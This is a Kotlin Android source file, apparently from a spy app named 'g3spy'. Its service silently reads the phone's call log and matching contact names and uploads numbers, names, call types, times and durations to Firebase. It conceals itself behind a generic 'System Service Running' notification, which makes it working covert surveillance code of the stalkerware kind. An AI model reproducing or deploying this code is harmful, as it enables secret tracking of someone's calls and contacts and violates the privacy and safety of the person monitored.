package com.g3spy.child.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.database.ContentObserver
import android.net.Uri
import android.os.Binder
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import androidx.core.app.NotificationCompat
import com.g3spy.child.util.NotificationChannelManager
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore
import java.util.*

/**
 * Service that monitors call logs and uploads them to Firebase
 */
class CallLogService : Service() {
    companion object {
        private const val TAG = "CallLogService"
        private const val NOTIFICATION_ID = 1003
        private const val CHANNEL_ID = "call_log_channel"
        private const val CHANNEL_NAME = "Call Log Tracker"
        private const val PREF_NAME = "CallLogServicePrefs"
        private const val LAST_CALL_TIME_KEY = "last_call_time"
    }
    
    private lateinit var firestore: FirebaseFirestore
    private lateinit var prefs: SharedPreferences
    private var callLogObserver: ContentObserver? = null
    
    private val binder = LocalBinder()
    
    inner class LocalBinder : Binder() {
        fun getService(): CallLogService = this@CallLogService
    }
    
    override fun onCreate() {
        super.onCreate()
        
        firestore = FirebaseFirestore.getInstance()
        prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        
        // Create the notification channel
        NotificationChannelManager.createNotificationChannel(
            this,
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_LOW
        )
        
        // Register call log observer
        registerCallLogObserver()
        
        // Check for existing call logs
        checkExistingCallLogs()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "CallLogService started")
        
        // Create a notification for the foreground service
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder {
        return binder
    }
    
    override fun onDestroy() {
        super.onDestroy()
        unregisterCallLogObserver()
    }
    
    private fun createNotification(): Notification {
        // Create an intent that will open the app when tapped
        val notificationIntent = Intent(this, this::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )
        
        // Build the notification
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service Running")
            .setContentText("Maintaining system services...")
            .setSmallIcon(android.R.drawable.ic_menu_call)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun registerCallLogObserver() {
        if (callLogObserver == null) {
            callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean) {
                    this.onChange(selfChange, null)
                }
                
                override fun onChange(selfChange: Boolean, uri: Uri?) {
                    Log.d(TAG, "Call log changed, checking for new calls")
                    checkExistingCallLogs()
                }
            }
            
            contentResolver.registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                callLogObserver!!
            )
            
            Log.d(TAG, "Call log observer registered")
        }
    }
    
    private fun unregisterCallLogObserver() {
        callLogObserver?.let {
            contentResolver.unregisterContentObserver(it)
            callLogObserver = null
            Log.d(TAG, "Call log observer unregistered")
        }
    }
    
    private fun checkExistingCallLogs() {
        // Get the timestamp of the last processed call
        val lastCallTime = prefs.getLong(LAST_CALL_TIME_KEY, 0L)
        
        // Query content provider for call logs
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            ),
            "${CallLog.Calls.DATE} > ?",
            arrayOf(lastCallTime.toString()),
            "${CallLog.Calls.DATE} DESC"
        )
        
        cursor?.use {
            if (it.moveToFirst()) {
                var mostRecentTimestamp = lastCallTime
                
                do {
                    val idIndex = it.getColumnIndex(CallLog.Calls._ID)
                    val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                    val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                    val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                    val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                    
                    if (idIndex >= 0 && numberIndex >= 0 && typeIndex >= 0 && 
                        dateIndex >= 0 && durationIndex >= 0) {
                        
                        val id = it.getString(idIndex)
                        val number = it.getString(numberIndex)
                        val type = it.getInt(typeIndex)
                        val date = it.getLong(dateIndex)
                        val duration = it.getInt(durationIndex)
                        
                        // Update most recent timestamp if needed
                        if (date > mostRecentTimestamp) {
                            mostRecentTimestamp = date
                        }
                        
                        // Get call type string
                        val callType = when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "MISSED"
                            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                            else -> "UNKNOWN"
                        }
                        
                        // Resolve contact name
                        val contactName = getContactName(number)
                        
                        Log.d(TAG, "Found call: $number ($contactName), type: $callType, duration: $duration sec")
                        uploadCallToFirebase(id, number, contactName, callType, date, duration)
                    }
                } while (it.moveToNext())
                
                // Update the last processed timestamp
                prefs.edit().putLong(LAST_CALL_TIME_KEY, mostRecentTimestamp).apply()
            }
        }
    }
    
    private fun getContactName(phoneNumber: String): String? {
        var contactName: String? = null
        
        // Query the contacts database
        val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
        val cursor = contentResolver.query(
            uri,
            arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
            null,
            null,
            null
        )
        
        cursor?.use {
            if (it.moveToFirst()) {
                val nameIndex = it.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                if (nameIndex >= 0) {
                    contactName = it.getString(nameIndex)
                }
            }
        }
        
        return contactName
    }
    
    private fun uploadCallToFirebase(
        id: String,
        phoneNumber: String,
        contactName: String?,
        callType: String,
        timestamp: Long,
        duration: Int
    ) {
        val callData = hashMapOf(
            "phoneNumber" to phoneNumber,
            "contactName" to contactName,
            "callType" to callType,
            "timestamp" to Timestamp(Date(timestamp)),
            "duration" to duration
        )
        
        firestore.collection("call_logs")
            .document(id)  // Using call ID as document ID to prevent duplicates
            .set(callData)
            .addOnSuccessListener {
                Log.d(TAG, "Call log uploaded with ID: $id")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error uploading call log", e)
            }
    }
}